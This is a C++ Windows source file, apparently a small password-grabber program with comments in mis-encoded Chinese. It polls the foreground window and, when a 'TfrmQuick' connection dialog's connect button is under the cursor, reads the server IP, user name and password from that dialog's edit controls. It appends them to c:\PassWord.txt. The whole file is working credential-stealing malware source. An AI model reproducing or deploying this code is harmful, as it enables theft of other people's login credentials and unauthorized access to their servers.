// PostMessage.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include <stdio.h>

int DataToFile( char *buff ) 
{ 
	//����CreateFile������ֻд��ʽ��һ���ļ�
	HANDLE hFile=CreateFile("c:\\PassWord.txt",GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE)
	{
		printf("CreateFile error\n");
		return 0;
	}
	//����SetFilePointer���������ļ�ָ��λ�ã��ƶ����ļ�ĩβ
	if(SetFilePointer(hFile,0,NULL,FILE_END)==-1)
	{
		printf("SetFilePointer error \n");	
		return 0;	
	}
	DWORD dwWrite;
	//��buff�е�����д�뵽�ļ�ĩβ
	if(!WriteFile(hFile,buff,strlen(buff),&dwWrite,NULL))
	{
		printf("WriteFile error \n");	
		return 0;	
	}
	CloseHandle(hFile);
	return 0;
} 
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	char PassWord[80]={0};
	char ServerIp[80]={0};
	char UserName[80]={0};
	char BackUserName[80]={0};
	//ѭ�����
	while(TRUE)
	{
		HWND hwnd;
		char ClassName[255];
		//�õ���ǰ����ھ��
		hwnd=GetForegroundWindow();
		//�õ���ǰ���������
		GetClassName(hwnd,ClassName,255);
		//�ж��Ƿ��ǿ������Ӵ���
		if(strcmp(ClassName,"TfrmQuick")==0)
		{
			char ButtonName[80]={0};
			tagPOINT lpPoint;
			//�õ���굱ǰ����
			GetCursorPos(&lpPoint);
			//�õ���ǰ�������ڴ���ľ��
			hwnd=WindowFromPoint(lpPoint);
			if(hwnd==NULL)
				continue;
			//����WM_GETTEXT��Ϣ���õ������ı�
			SendMessage(hwnd,WM_GETTEXT,80,(LPARAM)ButtonName);
			//�����ı�����Ϊ�����ӡ���˵������������Ӱ�ť����
			if(strcmp(ButtonName,"����")!=0)
				continue;
			hwnd=FindWindowEx(NULL,NULL,"TfrmQuick","��������");
			if(hwnd==NULL)
				continue;
			hwnd=FindWindowEx(hwnd,NULL,"TPageControl",NULL);
			if(hwnd==NULL)
				continue;
			hwnd=FindWindowEx(hwnd,NULL,"TTabSheet","����");
			if(hwnd==NULL)
				continue;
			HWND hFirst=FindWindowEx(hwnd,NULL,"TEdit",NULL);
			if(hFirst==NULL)
				continue;
			//�õ�������IP
			SendMessage(hFirst,WM_GETTEXT,80,(LPARAM)ServerIp);
			HWND hNext=FindWindowEx(hwnd,hFirst,"TEdit",NULL);
			if(hNext==NULL)
				continue;
			//�õ�����
			SendMessage(hNext,WM_GETTEXT,80,(LPARAM)PassWord);
			hNext=FindWindowEx(hwnd,hNext,"TEdit",NULL);
			if(hNext==NULL)
				continue;
			hNext=FindWindowEx(hwnd,hNext,"TEdit",NULL);
			if(hNext==NULL)
				continue;
			hNext=FindWindowEx(hwnd,hNext,"TEdit",NULL);
			if(hNext==NULL)
				continue;
			//�õ��û���
			SendMessage(hNext,WM_GETTEXT,80,(LPARAM)UserName);
			//����һ�εļ�¼���û����Ƚϣ���ֹ�ظ���¼
			if(strcmp(BackUserName,UserName)==0)
				continue;
			//�����û���
			strcpy(BackUserName,UserName);
			char Data[512]={0};
			//��ʽ������
			wsprintf(Data,"\r\n������IP��%s\r\n�û�����%s\r\n���룺%s\r\n",ServerIp,UserName,PassWord);
			//д���ļ�
			DataToFile(Data);	
		}
		Sleep(500);
	}
	return 0;
}



